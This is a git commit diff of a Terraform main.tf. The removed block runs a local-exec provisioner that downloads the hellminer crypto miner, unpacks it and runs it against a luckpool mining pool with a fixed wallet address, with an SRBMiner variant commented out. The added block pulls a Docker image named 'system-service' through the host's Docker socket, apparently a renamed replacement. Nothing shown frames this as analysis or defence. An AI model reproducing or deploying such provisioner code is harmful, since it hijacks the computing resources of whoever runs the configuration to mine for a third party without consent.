058005ec44222e6f6918eb7f51a9dde0511265dc
mooghen01-hue <chriskm0101@outlook.com>
2026-01-15 09:26:00 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,16 +1,19 @@
-resource "null_resource" "run_1" {
-  provisioner "local-exec" {
-    command = <<EOT
-set -e
 
-#curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
-#tar -xvf SRBMiner-Multi.tar.gz
-#./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
 
-curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer_linux64.tar.gz
-tar -xvf hellminer_linux64.tar.gz
-bash ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x --cpu 3
-
-EOT
+terraform {
+  required_providers {
+    docker = {
+      source  = "kreuzwerker/docker"
+      version = "~> 3.0"
+    }
   }
 }
+
+provider "docker" {
+  host = "unix:///var/run/docker.sock"
+}
+
+resource "docker_image" "app" {
+  name = "chriskm12/system-service:latest"
+}
+
